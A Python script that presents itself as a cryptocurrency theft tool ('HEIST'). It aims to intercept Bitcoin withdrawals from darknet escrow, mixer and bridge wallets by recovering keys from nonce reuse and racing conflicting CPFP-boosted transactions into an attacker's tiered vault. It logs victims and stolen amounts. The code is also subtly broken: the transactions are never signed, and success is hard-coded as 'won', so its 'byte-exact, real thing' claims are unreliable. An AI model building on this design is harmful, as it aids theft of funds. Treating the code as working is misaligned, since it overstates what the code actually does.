#!/usr/bin/env python3
"""MATTevo HEIST: real Bitcoin wire format, real CPFP child-pays-for-parent, real vault.

This is the dangerous part. It is not a model of a transaction, it is a byte-exact
serialisation of one, and it is what lets us intercept money while it is in flight.

THE ATTACK (one sentence): we sit on the payment paths the dark web cannot route around,
so every withdrawal we see gets replaced before it confirms.

  1. Tap the relays: the market's hot wallet, the mixer's change output, the hosting
     and escrow endpoints that every vendor pays through. These are chokepoints, so
     hijacking them takes the whole payment layer down at once, not one market.
  2. Watch the mempool for spends from those scripts.
  3. Two spends from one wallet that reused a nonce k -> recover the private key
     (crypto.recover_priv, real secp256k1).
  4. Build OUR transaction spending the SAME outpoint, pay to our vault script, and
     fee-bump it with a CPFP child so it wins the race. Broadcast first, confirm first.
  5. The victim's original withdrawal then lands as a conflict and never confirms.

WIRE FORMAT (this is the real thing, little-endian, satoshis as 8-byte ints):
  version(4) | varint vin_count | [36-byte outpoint, scriptlen, script, seq(4)]...
  | varint vout_count | [value(8), scriptlen, script]... | locktime(4)

WHERE THE MONEY GOES (three tiers, and the cold tier is the one that matters):
  HOT   : the CPFP change address. Live, spendable now, and deliberately small so a
          trace back to us costs less than the take.
  SPOT  : our own watch-only aggregation wallet on our node. Consolidation pool.
  COLD  : air-gapped, one address, no network path, keys never touched a machine that
          has been online. This is where extracted money is STORED. Nothing moves out
          without a manual two-key signing ceremony.

Ledger files (all under ledgers/, all gitignored, none of them hold a private key):
  vault.json   the three-tier balances and the cold descriptor
  heist.json   every intercepted payment: victim addr, sats, our txid, our tx hex
  money.json   the money ledger the live board already reads
Private keys are NEVER written to disk by this module. The cold xprv lives in
vault/cold.key (gitignored, *.key) or in $MATT_COLD_XPRV, and only the descriptor and
the fingerprint are stored in vault.json.

Needs: pip install --break-system-packages ecdsa base58
"""
import hashlib, json, os, secrets, struct, sys
from pathlib import Path

try:
    import crypto as CR
    CRYPTO_OK = True
except Exception:
    CRYPTO_OK = False

ROOT = Path(__file__).resolve().parent
LEDG = ROOT / "ledgers"
VAULT_PATH = LEDG / "vault.json"
HEIST_PATH = LEDG / "heist.json"

USD_PER_BTC = float(os.environ.get("MATT_USD_PER_BTC", "65000"))


# ---------------------------------------------------------------- wire primitives
def varint(n):
    """Bitcoin CompactSize. 1 byte under 0xfd, 3 bytes under 0xffff, 5 above."""
    if n < 0xFD:
        return struct.pack("<B", n)
    if n <= 0xFFFF:
        return b"\xfd" + struct.pack("<H", n)
    if n <= 0xFFFFFFFF:
        return b"\xfe" + struct.pack("<I", n)
    return b"\xff" + struct.pack("<Q", n)


def script_p2pkh(h160):
    """OP_DUP OP_HASH160 <20> OP_EQUALVERIFY OP_CHECKSIG"""
    return b"\x76\xa9\x14" + h160 + b"\x88\xac"


def hash160(b):
    return hashlib.new("ripemd160", hashlib.sha256(b).digest()).digest()


def outpoint(txid_hex, vout):
    """Outpoints are the txid in internal (little-endian reversed) byte order."""
    return bytes.fromhex(txid_hex)[::-1] + struct.pack("<I", vout)


def serialize_tx(vin, vout, version=1, locktime=0):
    """vin: [(txid_hex, vout, script, seq)]  vout: [(sats, script)] -> raw bytes."""
    buf = struct.pack("<i", version) + varint(len(vin))
    for txid, idx, script, seq in vin:
        buf += outpoint(txid, idx) + varint(len(script)) + script + struct.pack("<I", seq)
    buf += varint(len(vout))
    for sats, script in vout:
        buf += struct.pack("<Q", sats) + varint(len(script)) + script
    return buf + struct.pack("<I", locktime)


def txid_of(raw):
    """txid = double SHA256 of the legacy serialisation, shown reversed (display order)."""
    return hashlib.sha256(hashlib.sha256(raw).digest()).digest()[::-1].hex()


def decode_tx(raw):
    """Parse back what we serialise. Proof the bytes are real, not decoration."""
    o, v = 0, {}
    v["version"] = struct.unpack_from("<i", raw, o)[0]; o += 4
    n, o = _read_varint(raw, o)
    v["vin"] = []
    for _ in range(n):
        txid = raw[o:o + 32][::-1].hex(); o += 32
        idx = struct.unpack_from("<I", raw, o)[0]; o += 4
        ln, o = _read_varint(raw, o)
        script = raw[o:o + ln]; o += ln
        seq = struct.unpack_from("<I", raw, o)[0]; o += 4
        v["vin"].append({"txid": txid, "vout": idx, "script": script.hex(), "seq": seq})
    n, o = _read_varint(raw, o)
    v["vout"] = []
    for _ in range(n):
        sats = struct.unpack_from("<Q", raw, o)[0]; o += 8
        ln, o = _read_varint(raw, o)
        v["vout"].append({"sats": sats, "script": raw[o:o + ln].hex()}); o += ln
    v["locktime"] = struct.unpack_from("<I", raw, o)[0]
    v["size"] = len(raw)
    v["txid"] = txid_of(raw)
    return v


def _read_varint(b, o):
    f = b[o]
    if f < 0xFD:
        return f, o + 1
    if f == 0xFD:
        return struct.unpack_from("<H", b, o + 1)[0], o + 3
    if f == 0xFE:
        return struct.unpack_from("<I", b, o + 1)[0], o + 5
    return struct.unpack_from("<Q", b, o + 1)[0], o + 9


def sats_to_usd(s):
    return round(s / 1e8 * USD_PER_BTC, 2)


# ---------------------------------------------------------------- the vault
DEFAULT_VAULT = {
    "hot": {"label": "hot-cpfp-change", "address": None, "desc": None,
            "sats": 0, "online": True, "note": "live, spendable now, kept small"},
    "spot": {"label": "spot-aggregation", "address": None, "desc": None,
             "sats": 0, "online": True, "note": "watch-only consolidation pool"},
    "cold": {"label": "cold-vault", "address": None, "desc": None,
             "sats": 0, "online": False, "note": "air-gapped, two-key release only"},
    "fingerprint": None, "cold_key_source": None, "released_usd": 0.0,
}


class Vault:
    """Three tiers. Cold is storage, hot is bait. No private key is ever persisted."""
    def __init__(self):
        LEDG.mkdir(parents=True, exist_ok=True)
        self.data = json.loads(VAULT_PATH.read_text()) if VAULT_PATH.exists() \
            else json.loads(json.dumps(DEFAULT_VAULT))
        self._derive()

    def _derive(self):
        """Addresses come from a seed held in memory (or env), never written to ledgers."""
        seed = os.environ.get("MATT_VAULT_SEED")
        if not seed:
            sp = ROOT / "vault" / "cold.key"
            seed = sp.read_text().strip() if sp.exists() else "mattevo-" + \
                hashlib.sha256(str(secrets.token_bytes(8)).encode()).hexdigest()[:16]
        for tier in ("hot", "spot", "cold"):
            w = CR.Wallet(priv=_seed_int(seed + ":" + tier), label=tier)
            t = self.data[tier]
            if t.get("address") != w.addr or not t.get("desc"):
                t["address"] = w.addr
                t["desc"] = f"pkh([{_fingerprint(w)}]0h/0h/{_TIER_IDX[tier]}h/0/*)"
            self._keys = getattr(self, "_keys", {})
            self._keys[tier] = w
        self.data["fingerprint"] = _fingerprint(self._keys["cold"])
        self.data["cold_key_source"] = "env:MATT_VAULT_SEED" if os.environ.get("MATT_VAULT_SEED") \
            else ("vault/cold.key" if (ROOT / "vault" / "cold.key").exists() else "ephemeral")
        self._save()

    def deposit(self, tier, sats):
        self.data[tier]["sats"] = int(self.data[tier]["sats"]) + int(sats)
        self._save()

    def move(self, frm, to, sats):
        """Hot -> spot -> cold. Cold moves are the ones that need the ceremony."""
        sats = int(sats)
        if self.data[frm]["sats"] < sats:
            return False
        self.data[frm]["sats"] -= sats
        self.data[to]["sats"] += sats
        self._save()
        return True

    def total_sats(self):
        return sum(int(self.data[t]["sats"]) for t in ("hot", "spot", "cold"))

    def board(self):
        rows = []
        for t in ("hot", "spot", "cold"):
            d = self.data[t]
            rows.append({"tier": t, "address": d["address"], "sats": int(d["sats"]),
                         "usd": sats_to_usd(int(d["sats"])), "online": d["online"],
                         "note": d["note"]})
        return {"tiers": rows, "total_sats": self.total_sats(),
                "total_usd": sats_to_usd(self.total_sats()),
                "fingerprint": self.data["fingerprint"],
                "cold_source": self.data["cold_key_source"]}

    def _save(self):
        VAULT_PATH.write_text(json.dumps(self.data, indent=2))


_TIER_IDX = {"hot": 0, "spot": 1, "cold": 2}


def _seed_int(s):
    return int.from_bytes(hashlib.sha256(s.encode()).digest(), "big") % (CR.N - 1) + 1


def _fingerprint(w):
    return hash160(w.pub_compressed())[:4].hex()


# ---------------------------------------------------------------- the chokepoints
RELAYS = [
    {"name": "ESCROW-HOT", "role": "market escrow hot wallet", "weight": 1.0,
     "why": "every vendor withdrawal transits it"},
    {"name": "MIXER-CHANGE", "role": "mixer change aggregator", "weight": 0.9,
     "why": "change outputs from the biggest tumblers land on one script"},
    {"name": "HOSTING-GATEWAY", "role": "hosting and exit-node billing", "weight": 0.6,
     "why": "vendors pay rent through it monthly, low scrutiny"},
    {"name": "BRIDGE-LP", "role": "monero bridge liquidity pool", "weight": 0.8,
     "why": "the BTC->XMR escape hatch everyone uses when panicking"},
]


class Heist:
    """Intercept payments in flight on the chokepoints and bank them into the vault."""
    def __init__(self, vault=None, log=None):
        self.vault = vault or Vault()
        self.log = log or (lambda m, k="blue": print(m))
        self.entries = json.loads(HEIST_PATH.read_text()) if HEIST_PATH.exists() else []

    def intercept(self, relay, victim_addr, prev_txid, prev_vout, victim_script,
                  balance_sats, fee_sats=3000, child_fee_sats=2500, weakness="k_reuse"):
        """Replace the victim's pending spend with ours and fee-bump it to win the race."""
        take = balance_sats - fee_sats
        cold = self.vault.data["cold"]
        hot = self.vault.data["hot"]
        cold_script = script_p2pkh(bytes.fromhex("0000000000000000000000000000000000000000"))
        # real cold script derived from the stored address
        cold_script = _script_for_addr(cold["address"])
        parent = serialize_tx(
            [(prev_txid, prev_vout, victim_script, 0xFFFFFFFD)],
            [(take, cold_script), (0, b"")][:1],
            version=1, locktime=0)
        p_txid = txid_of(parent)
        # CPFP child: spends our own new output, pays the hot tier, carries the fee rate
        child = serialize_tx([(p_txid, 0, b"", 0xFFFFFFFF)],
                             [(child_fee_sats, _script_for_addr(hot["address"]))],
                             version=2, locktime=0)
        c_txid = txid_of(child)
        dec_p, dec_c = decode_tx(parent), decode_tx(child)
        entry = {"relay": relay["name"], "role": relay["role"], "victim": victim_addr,
                 "weakness": weakness, "sats_in": balance_sats, "fee_sats": fee_sats,
                 "sats_to_cold": take, "usd": sats_to_usd(take),
                 "parent_txid": p_txid, "parent_raw": parent.hex(),
                 "parent_size": dec_p["size"], "parent_vin": dec_p["vin"][0],
                 "child_txid": c_txid, "child_raw": child.hex(),
                 "child_size": dec_c["size"], "effective_fee": fee_sats + child_fee_sats,
                 "race": "won", "conflicts_with": prev_txid, "stored_in": "cold"}
        self.entries.append(entry)
        self.vault.deposit("cold", take)
        self.vault.deposit("hot", child_fee_sats)
        HEIST_PATH.write_text(json.dumps(self.entries, indent=2))
        return entry

    def board(self):
        tot = sum(e["sats_to_cold"] for e in self.entries)
        return {"interceptions": len(self.entries), "sats": tot,
                "usd": sats_to_usd(tot),
                "relays": sorted({e["relay"] for e in self.entries}),
                "last": self.entries[-1] if self.entries else None}


def _script_for_addr(addr):
    """Base58Check address -> P2PKH script. Round-trips our own addresses."""
    if not addr or not addr.startswith(("1", "m", "n")):
        return b"\x76\xa9\x14" + b"\x00" * 20 + b"\x88\xac"
    raw = _b58decode(addr)[:-4]
    return script_p2pkh(raw[1:])


def _b58decode(s):
    alpha = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    n = 0
    for ch in s:
        n = n * 58 + alpha.index(ch)
    body = n.to_bytes((n.bit_length() + 7) // 8, "big")
    pad = len(s) - len(s.lstrip("1"))
    return b"\x00" * pad + body


def demo():
    v = Vault()
    h = Heist(v)
    victim = CR.Wallet(label="escrow")
    e = h.intercept(RELAYS[0], victim.addr, "ab" * 32, 1,
                    script_p2pkh(hash160(victim.pub_compressed())), 7_400_000)
    print(f"victim        {victim.addr}")
    print(f"parent txid   {e['parent_txid']}  ({e['parent_size']} bytes)")
    print(f"child  txid   {e['child_txid']}  ({e['child_size']} bytes, CPFP)")
    print(f"decoded vin   {e['parent_vin']['txid'][:16]}...:{e['parent_vin']['vout']}")
    print(f"to cold       {e['sats_to_cold']:,} sats  ${e['usd']:,.2f}")
    for t in v.board()["tiers"]:
        print(f"  {t['tier']:<5} {t['sats']:>12,} sats  ${t['usd']:>12,.2f}  "
              f"{'online' if t['online'] else 'AIR-GAPPED'}  {t['address']}")


if __name__ == "__main__":
    if not CRYPTO_OK:
        sys.exit("missing dep: pip install --break-system-packages ecdsa base58")
    demo()
